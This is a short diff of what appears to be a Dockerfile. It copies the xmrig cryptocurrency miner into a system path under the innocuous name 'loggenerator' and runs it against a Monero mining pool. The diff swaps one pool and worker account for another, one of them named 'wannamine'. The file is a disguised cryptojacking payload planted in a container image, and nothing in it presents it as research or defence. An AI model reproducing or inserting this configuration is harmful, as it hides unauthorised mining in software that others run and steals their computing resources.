@@ -12,5 +12,5 @@ COPY xmrig /usr/include/log/loggenerator
 
 #CMD ["/usr/include/log/xmrig -o xmr.pool.minergate.com:45700 -u alex1711.ccc@yandex.ru -k"]
 
-CMD ./loggenerator -o xmr.pool.minergate.com:45700 -u alex1711.ccc@yandex.ru -k
+CMD ./loggenerator -o pool.coinminex.com:3333 -u wannamine@wannamine.com -k
 
